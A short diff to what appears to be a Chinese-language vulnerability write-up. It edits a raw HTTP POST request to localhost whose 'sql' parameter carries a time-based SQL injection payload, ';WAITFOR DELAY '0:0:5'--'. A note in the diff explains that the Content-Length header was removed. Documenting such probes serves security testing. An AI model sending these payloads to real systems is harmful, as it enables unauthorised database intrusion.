@@ -80,7 +80,7 @@ Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
 Content-Type: application/x-www-form-urlencoded
 
-token=z*h&sql=;WAITFOR DELAY '0:0:5'--&strParameters
+token=zxh&sql=;WAITFOR DELAY '0:0:5'--&strParameters
 ```
 
 > 请求长度说明：原资料 Content-Length 为 52；静态长度已移除，应由客户端根据最终请求体的字节数生成。
